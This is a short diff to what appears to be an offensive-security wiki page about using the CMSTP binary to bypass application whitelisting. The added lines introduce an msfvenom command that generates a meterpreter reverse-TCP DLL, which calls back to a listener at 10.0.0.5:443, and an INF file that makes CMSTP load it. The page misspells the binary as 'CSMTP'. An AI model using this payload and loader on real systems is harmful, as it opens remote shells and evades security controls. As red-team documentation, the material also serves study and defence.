@@ -6,6 +6,8 @@ description: CSMTP code execution - bypass application whitelisting.
 
 ## Code
 
+Generating evil payload as a DLL - a reverse shell:
+
 {% code-tabs %}
 {% code-tabs-item title="evil.dll" %}
 ```text
@@ -13,6 +15,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll 
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
+
+Creating a file that will be loaded by CSMTP binary that will in turn load our evil.dll:
 
 {% code-tabs %}
 {% code-tabs-item title="f.inf" %}
